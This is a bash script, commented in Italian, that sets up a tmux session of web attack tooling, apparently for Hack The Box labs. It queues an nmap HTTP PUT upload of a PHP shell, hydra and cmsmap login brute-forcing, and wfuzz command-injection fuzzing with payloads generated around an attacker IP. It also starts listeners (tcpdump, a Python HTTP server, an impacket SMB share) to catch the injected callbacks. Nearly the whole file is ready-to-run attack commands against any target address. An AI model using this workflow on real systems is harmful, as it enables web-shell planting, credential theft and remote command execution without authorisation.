#!/bin/bash

# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
source "common.sh"

# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "varie ed eventuali"

# OPEN-VPN
#tmux new-window -t PT:1 -n 'openVPN'
#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter

# WEB PUT HTTP
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:1 -n 'WEB PUT HTTP'
tmux split-window -v -t PT:1.0  
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# exploit PUT method attack" Enter
tmux send-keys -t PT:1.0 "nmap -p 80 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php' $ip # HTTP PUT Example" 
cd $folderProject



# WEB Bruteforce AuthN
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
tmux split-window -v -t PT:2.1
tmux split-window -v -t PT:2.2
tmux split-window -v -t PT:2.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# find valid dictionary" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
tmux send-keys -t PT:2.2 "# bruteforce BasicAuth authN" Enter
tmux send-keys -t PT:2.2 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
tmux send-keys -t PT:2.3 "# bruteforce CMS" Enter
tmux send-keys -t PT:2.3 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
cd $folderProject


# WEB Command Injection
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:3 -n 'WEB Command Injection'
tmux split-window -v -t PT:3.0
tmux split-window -v -t PT:3.1
tmux split-window -v -t PT:3.2
tmux split-window -v -t PT:3.3
tmux select-pane -t "3.1"
tmux split-window -h -t "3.1"
tmux split-window -h -t "3.1"
tmux select-pane -t "3.4"
tmux split-window -h -t "3.4"
tmux select-pane -t "3.6"
tmux split-window -h -t "3.6"

# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# automate command injection scan" Enter
tmux send-keys -t PT:3.0 "sudo uniscan -u http://$site -qweds"
tmux send-keys -t PT:3.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:3.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:3.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:3.2 "python3 -m http.server 80"
tmux send-keys -t PT:3.3 "# activate listener SMB" Enter
tmux send-keys -t PT:3.3 "impacket-smbserver -smb2support htb \$(pwd)"
tmux send-keys -t PT:3.4 "# verify blocked chars (GET)" Enter
tmux send-keys -t PT:3.4 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
tmux send-keys -t PT:3.5 "# verify blocked chars (POST)" Enter
tmux send-keys -t PT:3.5 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php"
#Preparo il file per le command injection
cd $folderProjectEngine
#tmux send-keys -t PT:3.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
python ./cmdGenerator.py $attackerIP cmdlist.txt
mv "$folderProjectEngine\out-command-injection-list.txt $folderProjectWebAuthN\out-command-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:3.6 "# command injection automation (GET)" Enter
tmux send-keys -t PT:3.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
tmux send-keys -t PT:3.7 "# command injection automation (POST)" Enter
tmux send-keys -t PT:3.7 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
cd $folderProject



# Attivazione della modalità interattiva
tmux -2 attach-session -t PT


